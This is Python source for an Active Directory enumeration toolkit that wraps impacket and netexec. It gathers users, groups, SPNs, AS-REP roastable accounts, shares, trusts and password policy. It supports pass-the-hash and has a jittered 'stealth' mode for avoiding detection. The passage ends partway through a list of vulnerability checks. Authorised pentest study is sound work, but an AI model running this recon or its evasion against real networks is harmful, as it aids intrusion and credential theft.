#!/usr/bin/env python3
"""
ADEnumToolkit - An educational Active Directory enumeration toolkit.

This tool bundles common *initial recon & enumeration* techniques used during
the early phase of an Active Directory assessment into a single, well-documented
CLI. It is built for learning and for lab environments (e.g. GOAD, HackTheBox,
TryHackMe, your own test domain).

    !!  FOR EDUCATIONAL / AUTHORIZED LAB USE ONLY  !!
    Running these techniques against systems you do not own or do not have
    explicit written permission to test is illegal in most jurisdictions.

It leans on two well-known, freely available toolsets:
  * impacket   -> direct LDAP queries, Kerberoasting (GetUserSPNs),
                  AS-REP roasting (GetNPUsers)
  * netexec    -> SMB-level checks: credential validation, shares, users,
                  groups, password policy, RID brute forcing

Every subcommand feeds its results into a central Report. At the end of a run
the toolkit prints a LinPEAS-style, colour-coded summary that highlights the
interesting findings, explains what each one means, and links to further
reading. Nothing here is novel offensive capability; the value of this project
is packaging standard, widely-documented recon cleanly as a study reference.
"""

from __future__ import annotations

import argparse
import getpass
import random
import shutil
import subprocess
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import IntEnum

# --------------------------------------------------------------------------- #
#  Pacing / "quiet mode" configuration                                         #
#  Set once from CLI args in main(); consulted by run() and LDAP searches so   #
#  requests can be spaced out (delay + random jitter) to be gentler on         #
#  firewalls and rate/volume-based detections. Opt-in: defaults are 0 (off).   #
# --------------------------------------------------------------------------- #
_DELAY = 0.0      # fixed seconds to wait before each external request
_JITTER = 0.0     # extra random 0..J seconds added on top of the delay
STEALTH = False   # convenience profile; see --stealth


def throttle() -> None:
    """Sleep delay + random(0, jitter) before an operation, if pacing is on."""
    wait = _DELAY + (random.uniform(0, _JITTER) if _JITTER else 0.0)
    if wait > 0:
        time.sleep(wait)

# --------------------------------------------------------------------------- #
#  Optional impacket imports                                                   #
# --------------------------------------------------------------------------- #
try:
    from impacket.ldap import ldap as impacket_ldap
    from impacket.ldap import ldapasn1 as ldapasn1
    IMPACKET_AVAILABLE = True
except Exception:  # pragma: no cover - environment dependent
    IMPACKET_AVAILABLE = False


# --------------------------------------------------------------------------- #
#  Pretty printing helpers                                                     #
# --------------------------------------------------------------------------- #
class C:
    """ANSI colour codes. Disabled automatically when output is not a TTY."""
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    GREY = "\033[90m"

    @classmethod
    def disable(cls) -> None:
        for name in dir(cls):
            if name.isupper():
                setattr(cls, name, "")


if not sys.stdout.isatty():
    C.disable()


def banner() -> None:
    print(
        f"""{C.CYAN}{C.BOLD}
   ___   ___  ______                  _____          _ _    _ _
  / _ \\ |   \\ | ____|_ __  _   _ _ __ |_   _|__   ___ | | | _(_) |_
 | |_| || |) ||  _| | '_ \\| | | | '_ \\  | |/ _ \\ / _ \\| | |/ / | __|
 |  _  || |) || |___| | | | |_| | | | | | | (_) | (_) | |   <| | |_
 |_| |_||___/ |_____|_| |_|\\__,_|_| |_| |_|\\___/ \\___/|_|_|\\_\\_|\\__|
{C.RESET}{C.GREY}        Active Directory enumeration toolkit - educational use only{C.RESET}
"""
    )


def info(msg: str) -> None:
    print(f"{C.BLUE}[*]{C.RESET} {msg}")


def good(msg: str) -> None:
    print(f"{C.GREEN}[+]{C.RESET} {msg}")


def warn(msg: str) -> None:
    print(f"{C.YELLOW}[!]{C.RESET} {msg}")


def err(msg: str) -> None:
    print(f"{C.RED}[-]{C.RESET} {msg}")


def section(title: str) -> None:
    print(f"\n{C.BOLD}{C.CYAN}=== {title} ==={C.RESET}")


# --------------------------------------------------------------------------- #
#  Reference material (shown LinPEAS-style next to relevant findings)          #
# --------------------------------------------------------------------------- #
REFS = {
    "general": "https://www.thehacker.recipes/ad/",
    "ldap": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap",
    "null": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb",
    "guest": "https://www.thehacker.recipes/ad/recon/null-sessions",
    "ridbrute": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/"
                "#enumeration-of-rids",
    "kerberoast": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/"
                  "kerberoast",
    "asreproast": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/"
                  "asreproast",
    "shares": "https://book.hacktricks.xyz/network-services-pentesting/"
              "pentesting-smb#smb-enumeration",
    "passpol": "https://www.thehacker.recipes/ad/recon/password-policy",
    "uac": "https://learn.microsoft.com/en-us/troubleshoot/windows-server/"
           "active-directory/useraccountcontrol-manipulate-account-properties",
    "delegation": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/"
                  "unconstrained-delegation",
    "pth": "https://www.thehacker.recipes/ad/movement/ntlm/pth",
    # Known-vulnerability references
    "ms17-010": "https://learn.microsoft.com/security-updates/securitybulletins/2017/ms17-010",
    "zerologon": "https://www.secura.com/blog/zero-logon",
    "nopac": "https://www.secureworks.com/blog/samaccountname-spoofing",
    "petitpotam": "https://msrc.microsoft.com/update-guide/vulnerability/ADV210003",
    "printnightmare": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527",
    "spooler": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/"
               "printers-spooler-service-abuse",
    "smbghost": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796",
    "smbv1": "https://learn.microsoft.com/windows-server/storage/file-server/"
             "troubleshoot/detect-enable-and-disable-smbv1-v2-v3",
    "smbsigning": "https://www.thehacker.recipes/ad/movement/ntlm/relay",
    "ldapsigning": "https://www.thehacker.recipes/ad/movement/ntlm/relay",
    "maq": "https://www.thehacker.recipes/ad/movement/domain-settings/"
           "machineaccountquota",
    # bloodyAD-style reads
    "trusts": "https://www.thehacker.recipes/ad/movement/trusts",
    "writable": "https://www.thehacker.recipes/ad/movement/dacl",
    "dns": "https://www.thehacker.recipes/ad/recon/bloodhound/adidns",
    "gmsa": "https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword",
    "bloodyad": "https://github.com/CravateRouge/bloodyAD",
}


# --------------------------------------------------------------------------- #
#  Report model - the LinPEAS-style summary is built from these               #
# --------------------------------------------------------------------------- #
class Sev(IntEnum):
    """Severity / interest level of a finding."""
    CRITICAL = 4   # directly exploitable / crackable credential material
    HIGH = 3       # strong foothold or high-value misconfiguration
    MEDIUM = 2     # notable, worth following up
    INFO = 1       # neutral informational data
    OK = 0         # a check that passed / nothing wrong


SEV_STYLE = {
    Sev.CRITICAL: (C.RED + C.BOLD, "CRIT"),
    Sev.HIGH:     (C.RED, "HIGH"),
    Sev.MEDIUM:   (C.YELLOW, "MED "),
    Sev.INFO:     (C.CYAN, "INFO"),
    Sev.OK:       (C.GREEN, " OK "),
}


@dataclass
class Finding:
    severity: Sev
    title: str
    details: list[str] = field(default_factory=list)
    explanation: str = ""
    ref: str = ""


@dataclass
class Report:
    """Collects findings during a run and renders a LinPEAS-style summary."""
    target: str = ""
    domain: str = ""
    creds: str = ""
    started: str = field(default_factory=lambda: datetime.now().isoformat(timespec="seconds"))
    sections: dict[str, list[Finding]] = field(default_factory=dict)

    def add(self, category: str, finding: Finding) -> None:
        self.sections.setdefault(category, []).append(finding)

    def add_f(
        self,
        category: str,
        severity: Sev,
        title: str,
        details: list[str] | None = None,
        explanation: str = "",
        ref: str = "",
    ) -> None:
        self.add(category, Finding(severity, title, details or [], explanation, ref))

    # -- counts for the header line --------------------------------------- #
    def _counts(self) -> dict[Sev, int]:
        counts = {s: 0 for s in Sev}
        for findings in self.sections.values():
            for f in findings:
                counts[f.severity] += 1
        return counts

    # -- rendering --------------------------------------------------------- #
    def render(self) -> None:
        width = 74
        print(f"\n{C.MAGENTA}{C.BOLD}{'╔' + '═' * (width - 2) + '╗'}{C.RESET}")
        title = " ADEnumToolkit - Enumeration Report "
        pad = width - 2 - len(title)
        print(
            f"{C.MAGENTA}{C.BOLD}║{C.RESET}{C.BOLD}{title}{C.RESET}"
            f"{' ' * pad}{C.MAGENTA}{C.BOLD}║{C.RESET}"
        )
        print(f"{C.MAGENTA}{C.BOLD}{'╚' + '═' * (width - 2) + '╝'}{C.RESET}")

        print(f" {C.GREY}Target  :{C.RESET} {self.target}")
        print(f" {C.GREY}Domain  :{C.RESET} {self.domain or '(unknown)'}")
        print(f" {C.GREY}Creds   :{C.RESET} {self.creds}")
        print(f" {C.GREY}Started :{C.RESET} {self.started}")

        counts = self._counts()
        summary = "  ".join(
            f"{SEV_STYLE[s][0]}{SEV_STYLE[s][1].strip()}:{counts[s]}{C.RESET}"
            for s in (Sev.CRITICAL, Sev.HIGH, Sev.MEDIUM, Sev.INFO, Sev.OK)
            if counts[s]
        )
        print(f" {C.GREY}Findings:{C.RESET} {summary or 'none'}\n")

        # Legend
        print(f" {C.GREY}Legend:{C.RESET} " + "  ".join(
            f"{SEV_STYLE[s][0]}{SEV_STYLE[s][1].strip()}{C.RESET}"
            for s in (Sev.CRITICAL, Sev.HIGH, Sev.MEDIUM, Sev.INFO, Sev.OK)
        ))

        if not self.sections:
            print(f"\n{C.GREY}No findings were recorded.{C.RESET}")
            return

        for category, findings in self.sections.items():
            print(f"\n{C.BOLD}{C.BLUE}╭─[ {category} ]{C.RESET}")
            # Most interesting findings first.
            for f in sorted(findings, key=lambda x: x.severity, reverse=True):
                colour, tag = SEV_STYLE[f.severity]
                print(f"{C.BLUE}│{C.RESET} {colour}[{tag}]{C.RESET} {C.BOLD}{f.title}{C.RESET}")
                for d in f.details:
                    print(f"{C.BLUE}│{C.RESET}       {colour}•{C.RESET} {d}")
                if f.explanation:
                    print(f"{C.BLUE}│{C.RESET}       {C.GREY}{f.explanation}{C.RESET}")
                if f.ref:
                    print(f"{C.BLUE}│{C.RESET}       {C.DIM}{C.CYAN}↳ {f.ref}{C.RESET}")
            print(f"{C.BLUE}╰{'─' * 40}{C.RESET}")

        print(
            f"\n{C.GREY}Report generated by ADEnumToolkit. "
            f"Validate findings manually; enumeration output can be incomplete "
            f"or misleading.{C.RESET}"
        )
        print(f"{C.GREY}Further reading: {REFS['general']}{C.RESET}")


# Single report instance shared across the run.
REPORT = Report()


# --------------------------------------------------------------------------- #
#  External tool helpers                                                       #
# --------------------------------------------------------------------------- #
def which(tool: str) -> str | None:
    return shutil.which(tool)


def find_netexec() -> str | None:
    """netexec ships as either `nxc` (new name) or `netexec`/`crackmapexec`."""
    for name in ("nxc", "netexec", "crackmapexec"):
        path = which(name)
        if path:
            return path
    return None


def find_bloodyad() -> str | None:
    """bloodyAD may be installed as `bloodyAD` or `bloodyad`."""
    for name in ("bloodyAD", "bloodyad"):
        path = which(name)
        if path:
            return path
    return None


def find_impacket_script(script: str) -> str | None:
    """Impacket example scripts vary by packaging (GetUserSPNs.py vs impacket-...)."""
    candidates = [script, f"impacket-{script[:-3]}" if script.endswith(".py") else script]
    for name in candidates:
        path = which(name)
        if path:
            return path
    return None


def run(cmd: list[str], dry_run: bool = False, capture: bool = True) -> tuple[int, str]:
    """
    Run an external command. Returns (exit_code, combined_output).

    When capture=True the output is both shown to the user and captured so the
    report builders can parse highlights out of it.
    """
    printable = " ".join(repr(c) if (" " in c or c == "") else c for c in cmd)
    info(f"Executing: {C.GREY}{printable}{C.RESET}")
    if dry_run:
        warn("Dry-run mode: command not actually executed.")
        return 0, ""
    throttle()
    try:
        if capture:
            completed = subprocess.run(cmd, capture_output=True, text=True)
            output = (completed.stdout or "") + (completed.stderr or "")
            if output.strip():
                print(output.rstrip())
            return completed.returncode, output
        completed = subprocess.run(cmd)
        return completed.returncode, ""
    except FileNotFoundError:
        err(f"Command not found: {cmd[0]}")
        return 127, ""
    except KeyboardInterrupt:
        warn("Interrupted by user.")
        return 130, ""


# --------------------------------------------------------------------------- #
#  Credentials container                                                       #
# --------------------------------------------------------------------------- #
class Creds:
    """
    Authentication context shared by every subcommand. Supports:
      * null session   (no username / no password)
      * guest          (username 'guest', empty password)
      * password auth  (-u user -p pass)
      * pass-the-hash  (-u user -H LMHASH:NTHASH)
    """

    def __init__(self, args: argparse.Namespace):
        self.domain: str = args.domain or ""
        self.dc_ip: str = args.dc_ip
        self.username: str = args.username or ""
        self.password: str = args.password or ""
        self.nthash: str = args.hashes or ""
        self.null: bool = args.null

        if self.null:
            self.username = ""
            self.password = ""

        if (
            self.username
            and not self.password
            and not self.nthash
            and not self.null
            and getattr(args, "ask_password", True)
        ):
            try:
                self.password = getpass.getpass(f"Password for {self.username}: ")
            except (KeyboardInterrupt, EOFError):
                print()
                warn("No password entered; continuing without one.")

    @property
    def is_anonymous(self) -> bool:
        return not self.username

    @property
    def user_domain(self) -> str:
        if self.domain:
            return f"{self.domain}/{self.username}"
        return self.username

    def describe(self) -> str:
        if self.null:
            return "null session (anonymous)"
        if not self.username:
            return "anonymous"
        if self.nthash:
            return f"{self.username} (pass-the-hash)"
        if self.password:
            return f"{self.username} (password)"
        return f"{self.username} (no secret)"

    def netexec_auth(self) -> list[str]:
        parts: list[str] = []
        if self.null:
            parts += ["-u", "", "-p", ""]
        else:
            parts += ["-u", self.username or "", "-p", self.password or ""]
            if self.nthash:
                parts += ["-H", self.nthash]
        return parts


# --------------------------------------------------------------------------- #
#  impacket LDAP enumeration                                                   #
# --------------------------------------------------------------------------- #
UAC_FLAGS = {
    0x00000002: "ACCOUNTDISABLE",
    0x00000010: "LOCKOUT",
    0x00000020: "PASSWD_NOTREQD",
    0x00000040: "PASSWD_CANT_CHANGE",
    0x00010000: "DONT_EXPIRE_PASSWORD",
    0x00040000: "SMARTCARD_REQUIRED",
    0x00080000: "TRUSTED_FOR_DELEGATION",          # unconstrained delegation
    0x00400000: "DONT_REQ_PREAUTH",                # AS-REP roastable
    0x01000000: "TRUSTED_TO_AUTH_FOR_DELEGATION",  # constrained delegation
}


def decode_uac(value: int) -> list[str]:
    return [name for bit, name in UAC_FLAGS.items() if value & bit]


class LdapEnumerator:
    """Thin wrapper around impacket's LDAP client for read-only enumeration."""

    def __init__(self, creds: Creds, use_ldaps: bool = False):
        if not IMPACKET_AVAILABLE:
            raise RuntimeError("impacket is not installed. Install: pip install impacket")
        self.creds = creds
        self.use_ldaps = use_ldaps
        self.connection: impacket_ldap.LDAPConnection | None = None
        self.base_dn = self._domain_to_base_dn(creds.domain)

    @staticmethod
    def _domain_to_base_dn(domain: str) -> str:
        if not domain:
            return ""
        return ",".join(f"DC={part}" for part in domain.split("."))

    def connect(self) -> None:
        proto = "ldaps" if self.use_ldaps else "ldap"
        target = f"{proto}://{self.creds.dc_ip}"
        info(f"Connecting to {target} (base DN: {self.base_dn or 'auto'})")
        self.connection = impacket_ldap.LDAPConnection(target, self.base_dn, self.creds.dc_ip)
        lm, nt = "", ""
        if self.creds.nthash:
            if ":" in self.creds.nthash:
                lm, nt = self.creds.nthash.split(":", 1)
            else:
                nt = self.creds.nthash
        self.connection.login(self.creds.username, self.creds.password, self.creds.domain, lm, nt)
        good(f"LDAP bind successful as {self.creds.describe()}")

    def search(self, search_filter: str, attributes: list[str]) -> list:
        assert self.connection is not None
        results: list = []
        throttle()
        try:
            self.connection.search(
                searchFilter=search_filter,
                attributes=attributes,
                sizeLimit=0,
                perRecordCallback=lambda item: results.append(item),
            )
        except impacket_ldap.LDAPSearchError as e:
            if "sizeLimitExceeded" not in str(e):
                err(f"LDAP search error: {e}")
        return results

    @staticmethod
    def _attrs(item) -> dict:
        out: dict[str, list[str]] = {}
        if not isinstance(item, ldapasn1.SearchResultEntry):
            return out
        for attribute in item["attributes"]:
            out[str(attribute["type"])] = [str(v) for v in attribute["vals"]]
        return out

    @staticmethod
    def _one(attrs: dict, key: str, default: str = "") -> str:
        vals = attrs.get(key)
        return vals[0] if vals else default

    # -- enumeration routines (print live + feed the report) --------------- #
    def enum_users(self) -> None:
        section("Domain users (LDAP)")
        attrs = ["sAMAccountName", "userAccountControl", "description", "memberOf"]
        results = self.search("(&(objectCategory=person)(objectClass=user))", attrs)
        names: list[str] = []
        interesting: list[str] = []
        for item in results:
            a = self._attrs(item)
            if "sAMAccountName" not in a:
                continue
            name = self._one(a, "sAMAccountName")
            names.append(name)
            try:
                uac = int(self._one(a, "userAccountControl", "0"))
            except ValueError:
                uac = 0
            flags = decode_uac(uac)
            flag_str = f" {C.YELLOW}[{', '.join(flags)}]{C.RESET}" if flags else ""
            desc = self._one(a, "description")
            desc_str = f" {C.GREY}- {desc}{C.RESET}" if desc else ""
            print(f"  {C.GREEN}{name}{C.RESET}{flag_str}{desc_str}")

            # Flag genuinely risky account states for the report.
            risky = {"DONT_REQ_PREAUTH", "PASSWD_NOTREQD", "TRUSTED_FOR_DELEGATION",
                     "TRUSTED_TO_AUTH_FOR_DELEGATION"}
            if risky.intersection(flags):
                interesting.append(f"{name}: {', '.join(sorted(risky.intersection(flags)))}")
            # Passwords sometimes get stored in the description field.
            if desc and any(k in desc.lower() for k in ("pass", "pwd", "pw:", "credential")):
                REPORT.add_f(
                    "Users", Sev.HIGH,
                    f"Possible secret in description of '{name}'",
                    details=[desc],
                    explanation="Admins sometimes store passwords in the description "
                                "attribute, which any authenticated user can read.",
                    ref=REFS["ldap"],
                )
        good(f"{len(names)} user object(s) found.")
        REPORT.add_f(
            "Users", Sev.INFO, f"{len(names)} domain user account(s) enumerated via LDAP",
            details=names[:25] + (["..."] if len(names) > 25 else []),
            explanation="A full user list feeds password spraying, roasting target "
                        "selection and spotting service/admin naming conventions.",
            ref=REFS["ldap"],
        )
        if interesting:
            REPORT.add_f(
                "Users", Sev.HIGH, "Accounts with risky userAccountControl flags",
                details=interesting,
                explanation="These UAC flags expose accounts to AS-REP roasting, "
                            "empty passwords or delegation abuse.",
                ref=REFS["uac"],
            )

    def enum_groups(self) -> None:
        section("Domain groups (LDAP)")
        results = self.search("(objectClass=group)", ["sAMAccountName", "description", "member"])
        names: list[str] = []
        priv_hits: list[str] = []
        priv_keywords = ("admin", "domain admins", "enterprise admins", "backup operators",
                         "server operators", "account operators", "dnsadmins")
        for item in results:
            a = self._attrs(item)
            if "sAMAccountName" not in a:
                continue
            name = self._one(a, "sAMAccountName")
            names.append(name)
            members = len(a.get("member", []))
            desc = self._one(a, "description")
            desc_str = f" {C.GREY}- {desc}{C.RESET}" if desc else ""
            print(f"  {C.GREEN}{name}{C.RESET} {C.GREY}({members} members){C.RESET}{desc_str}")
            if any(k in name.lower() for k in priv_keywords) and members:
                priv_hits.append(f"{name} ({members} members)")
        good(f"{len(names)} group(s) found.")
        REPORT.add_f(
            "Groups", Sev.INFO, f"{len(names)} domain group(s) enumerated",
            details=names[:25] + (["..."] if len(names) > 25 else []),
            ref=REFS["ldap"],
        )
        if priv_hits:
            REPORT.add_f(
                "Groups", Sev.MEDIUM, "Privileged groups with members",
                details=priv_hits,
                explanation="Membership of these groups is a primary escalation target; "
                            "enumerate their members to pick the next account to attack.",
                ref=REFS["general"],
            )

    def enum_computers(self) -> None:
        section("Domain computers (LDAP)")
        attrs = ["sAMAccountName", "dNSHostName", "operatingSystem"]
        results = self.search("(objectClass=computer)", attrs)
        rows: list[str] = []
        legacy: list[str] = []
        for item in results:
            a = self._attrs(item)
            if "sAMAccountName" not in a:
                continue
            name = self._one(a, "sAMAccountName")
            host = self._one(a, "dNSHostName")
            os_name = self._one(a, "operatingSystem")
            extra = " ".join(x for x in (host, os_name) if x)
            print(f"  {C.GREEN}{name}{C.RESET} {C.GREY}{extra}{C.RESET}")
            rows.append(f"{name} {os_name}".strip())
            if os_name and any(old in os_name for old in ("2003", "2008", "XP", "Vista", "2000")):
                legacy.append(f"{name}: {os_name}")
        good(f"{len(rows)} computer(s) found.")
        REPORT.add_f(
            "Computers", Sev.INFO, f"{len(rows)} domain computer(s) enumerated",
            details=rows[:25] + (["..."] if len(rows) > 25 else []),
            ref=REFS["ldap"],
        )
        if legacy:
            REPORT.add_f(
                "Computers", Sev.MEDIUM, "Legacy / end-of-life operating systems present",
                details=legacy,
                explanation="EOL Windows versions often lack patches for well-known "
                            "remote exploits and weaken the whole domain.",
                ref=REFS["general"],
            )

    def enum_spns(self) -> None:
        section("Kerberoastable accounts (SPN set) - LDAP view")
        attrs = ["sAMAccountName", "servicePrincipalName"]
        results = self.search(
            "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))", attrs)
        rows: list[str] = []
        for item in results:
            a = self._attrs(item)
            if "sAMAccountName" not in a:
                continue
            name = self._one(a, "sAMAccountName")
            spns = a.get("servicePrincipalName", [])
            print(f"  {C.GREEN}{name}{C.RESET}")
            for spn in spns:
                print(f"      {C.GREY}{spn}{C.RESET}")
            rows.append(f"{name} ({len(spns)} SPN)")
        good(f"{len(rows)} account(s) with SPN.")
        if rows:
            REPORT.add_f(
                "Kerberos", Sev.HIGH, f"{len(rows)} Kerberoastable account(s) (SPN set)",
                details=rows,
                explanation="Any authenticated user can request a TGS for these accounts "
                            "and crack the service password offline. Run the 'kerberoast' "
                            "subcommand to pull the hashes.",
                ref=REFS["kerberoast"],
            )

    def enum_asrep(self) -> None:
        section("AS-REP roastable accounts (DONT_REQ_PREAUTH) - LDAP view")
        attrs = ["sAMAccountName", "userAccountControl"]
        results = self.search(
            "(&(objectCategory=person)(objectClass=user)"
            "(userAccountControl:1.2.840.113556.1.4.803:=4194304))", attrs)
        rows: list[str] = []
        for item in results:
            a = self._attrs(item)
            if "sAMAccountName" not in a:
                continue
            name = self._one(a, "sAMAccountName")
            print(f"  {C.GREEN}{name}{C.RESET}")
            rows.append(name)
        good(f"{len(rows)} account(s) without Kerberos pre-auth.")
        if rows:
            REPORT.add_f(
                "Kerberos", Sev.HIGH, f"{len(rows)} AS-REP roastable account(s)",
                details=rows,
                explanation="These accounts do not require Kerberos pre-authentication, so "
                            "an AS-REP hash can be requested without credentials and cracked "
                            "offline. Run the 'asreproast' subcommand.",
                ref=REFS["asreproast"],
            )

    def enum_trusts(self) -> None:
        """Domain trust relationships (trustedDomain objects)."""
        section("Domain trusts (LDAP)")
        dirs = {"0": "Disabled", "1": "Inbound", "2": "Outbound", "3": "Bidirectional"}
        types = {"1": "Downlevel(NT)", "2": "Uplevel(AD)", "3": "MIT", "4": "DCE"}
        attrs = ["trustPartner", "trustDirection", "trustType", "trustAttributes", "flatName"]
        results = self.search("(objectClass=trustedDomain)", attrs)
        rows: list[str] = []
        for item in results:
            a = self._attrs(item)
            partner = self._one(a, "trustPartner") or self._one(a, "flatName")
            if not partner:
                continue
            d = dirs.get(self._one(a, "trustDirection"), self._one(a, "trustDirection"))
            ty = types.get(self._one(a, "trustType"), self._one(a, "trustType"))
            label = f"{partner} [{d}, {ty}]"
            print(f"  {C.GREEN}{partner}{C.RESET} {C.GREY}({d}, {ty}){C.RESET}")
            rows.append(label)
        good(f"{len(rows)} trust(s) found.")
        if rows:
            REPORT.add_f(
                "Trusts", Sev.MEDIUM, f"{len(rows)} domain trust(s)",
                details=rows,
                explanation="Inbound/bidirectional trusts can be abused to move between "
                            "domains or forests (SID history, trust tickets).",
                ref=REFS["trusts"],
            )

    def enum_domaininfo(self) -> None:
        """Domain-level attributes: functional level, lockout, min password length."""
        section("Domain information (LDAP)")
        levels = {
            "0": "2000", "1": "2003 interim", "2": "2003", "3": "2008",
            "4": "2008 R2", "5": "2012", "6": "2012 R2", "7": "2016",
            "10": "2025/latest",
        }
        attrs = ["msDS-Behavior-Version", "minPwdLength", "lockoutThreshold",
                 "ms-DS-MachineAccountQuota"]
        results = self.search("(objectClass=domainDNS)", attrs)
        details: list[str] = []
        for item in results:
            a = self._attrs(item)
            if not a:
                continue
            fl = self._one(a, "msDS-Behavior-Version")
            if fl:
                details.append(f"Functional level: Windows {levels.get(fl, fl)}")
            if "minPwdLength" in a:
                details.append(f"Minimum password length: {self._one(a, 'minPwdLength')}")
            if "lockoutThreshold" in a:
                details.append(f"Lockout threshold: {self._one(a, 'lockoutThreshold')}")
            if "ms-DS-MachineAccountQuota" in a:
                details.append(f"MachineAccountQuota: {self._one(a, 'ms-DS-MachineAccountQuota')}")
        for d in details:
            print(f"  {C.GREEN}{d}{C.RESET}")
        if details:
            REPORT.add_f(
                "Domain", Sev.INFO, "Domain configuration",
                details=details,
                explanation="Baseline domain posture: a low functional level or weak "
                            "policy widens the attack surface.",
                ref=REFS["general"],
            )

    def list_gmsa(self) -> list[str]:
        """Return the sAMAccountNames of Group Managed Service Accounts."""
        results = self.search(
            "(objectClass=msDS-GroupManagedServiceAccount)", ["sAMAccountName"])
        names: list[str] = []
        for item in results:
            a = self._attrs(item)
            if "sAMAccountName" in a:
                names.append(self._one(a, "sAMAccountName"))
        return names


# --------------------------------------------------------------------------- #
#  netexec output parsing (heuristic, resilient)                               #
# --------------------------------------------------------------------------- #
def _lines(output: str) -> list[str]:
    return [ln.rstrip() for ln in output.splitlines() if ln.strip()]


def parse_cred_check(output: str, creds: Creds) -> None:
    low = output.lower()
    if "pwn3d" in low or "(pwn3d!)" in low:
        REPORT.add_f(
            "Access", Sev.CRITICAL, f"Local admin confirmed for {creds.describe()}",
            explanation="netexec reported 'Pwn3d!' - the account is a local administrator "
                        "on the target, enabling credential dumping and lateral movement.",
            ref=REFS["pth"],
        )
    elif "[+]" in output and "status_" not in low:
        REPORT.add_f(
            "Access", Sev.HIGH, f"Credentials valid: {creds.describe()}",
            explanation="Authentication succeeded. Even a low-privilege account unlocks "
                        "authenticated LDAP, roasting and share enumeration.",
            ref=REFS["general"],
        )
    elif "status_logon_failure" in low or "status_account_disabled" in low:
        REPORT.add_f(
            "Access", Sev.INFO, f"Credentials rejected: {creds.describe()}",
            explanation="Authentication failed (bad password / disabled account).",
        )
    elif creds.is_anonymous and "[+]" in output:
        REPORT.add_f(
            "Access", Sev.MEDIUM, "Anonymous / null session accepted",
            explanation="The DC allowed an unauthenticated session - a classic foothold "
                        "for further enumeration.",
            ref=REFS["null"],
        )


def parse_shares(output: str) -> None:
    rw: list[str] = []
    for ln in _lines(output):
        low = ln.lower()
        if ("read" in low or "write" in low) and "permission" not in low:
            # Typical netexec share row: "SHARE  READ,WRITE  Comment"
            rw.append(ln.split("SMB")[-1].strip() if "SMB" in ln else ln.strip())
    writable = [s for s in rw if "write" in s.lower()]
    if rw:
        REPORT.add_f(
            "Shares", Sev.INFO if not writable else Sev.MEDIUM,
            f"{len(rw)} accessible SMB share(s)",
            details=rw[:25] + (["..."] if len(rw) > 25 else []),
            explanation="Readable shares may leak scripts, configs or credentials; "
                        "writable shares can enable poisoning / payload drops.",
            ref=REFS["shares"],
        )
    if writable:
        REPORT.add_f(
            "Shares", Sev.HIGH, f"{len(writable)} writable share(s)",
            details=writable,
            explanation="Write access to a share is a common path to code execution "
                        "or credential capture.",
            ref=REFS["shares"],
        )


def parse_userlist(output: str, label: str, ref: str) -> int:
    """Count user rows in netexec --users / --rid-brute output."""
    users: list[str] = []
    for ln in _lines(output):
        low = ln.lower()
        if "sidtypeuser" in low or ("-username-" in low):
            continue
        # netexec prints "DOMAIN\\user" rows; capture those.
        if "\\" in ln and "smb" in low:
            frag = ln.split("\\", 1)[1].split()[0]
            if frag and frag.lower() not in ("name", "username"):
                users.append(frag)
    users = sorted(set(users))
    if users:
        REPORT.add_f(
            "Users", Sev.INFO, f"{len(users)} account(s) via {label}",
            details=users[:30] + (["..."] if len(users) > 30 else []),
            explanation="A username list is the raw material for spraying and roasting.",
            ref=ref,
        )
    return len(users)


def parse_passpol(output: str) -> None:
    details: list[str] = []
    weak = False
    for ln in _lines(output):
        low = ln.lower()
        if "minimum password length" in low:
            details.append(ln.strip().split("SMB")[-1].strip() if "SMB" in ln else ln.strip())
            # Pull the number if we can.
            digits = [int(tok) for tok in ln.replace(":", " ").split() if tok.isdigit()]
            if digits and min(digits) <= 7:
                weak = True
        elif "account lockout threshold" in low:
            details.append(ln.strip().split("SMB")[-1].strip() if "SMB" in ln else ln.strip())
            if "none" in low or "0" in low.split("threshold")[-1]:
                weak = True
    if details:
        REPORT.add_f(
            "Password policy", Sev.MEDIUM if weak else Sev.INFO,
            "Domain password policy retrieved",
            details=details,
            explanation="A short minimum length or no lockout threshold makes password "
                        "spraying safe and effective - note this before any guessing.",
            ref=REFS["passpol"],
        )


# --------------------------------------------------------------------------- #
#  Known-vulnerability enumeration                                             #
# --------------------------------------------------------------------------- #
# netexec ships detection modules that check (without exploiting) for a number
# of well-known AD/SMB flaws. We run them in their default "check" mode and
# parse the result. Each entry maps a short key -> how to run and report it.
#
#   needs_creds: module requires valid domain credentials to run meaningfully
#   proto      : netexec protocol (smb / ldap)
@dataclass
class VulnModule:
    key: str
    module: str
    proto: str
    needs_creds: bool
    severity: Sev
    cve: str
    ref_key: str
    desc: str


NXC_VULN_MODULES: list[VulnModule] = [
    VulnModule("ms17-010", "ms17-010", "smb", False, Sev.CRITICAL,
               "CVE-2017-0144 (EternalBlue)", "ms17-010",
               "Remote code execution via a flaw in SMBv1. One of the most "
               "impactful unauthenticated RCE bugs in Windows."),
    VulnModule("zerologon", "zerologon", "smb", False, Sev.CRITICAL,
               "CVE-2020-1472 (Zerologon)", "zerologon",
               "A Netlogon cryptographic flaw lets an unauthenticated attacker "
               "reset the DC machine account password and take over the domain. "
               "This module only *checks* - it does not reset anything."),
    VulnModule("nopac", "nopac", "smb", True, Sev.HIGH,
               "CVE-2021-42278/42287 (noPac/sAMAccountName spoofing)", "nopac",
               "Lets a low-privilege user impersonate a DC and escalate to "
               "domain admin. Requires valid credentials to check."),
    VulnModule("petitpotam", "petitpotam", "smb", False, Sev.HIGH,
               "CVE-2021-36942 (PetitPotam)", "petitpotam",
               "MS-EFSRPC coercion forces a host to authenticate to an attacker, "
               "enabling NTLM relay (often to AD CS)."),
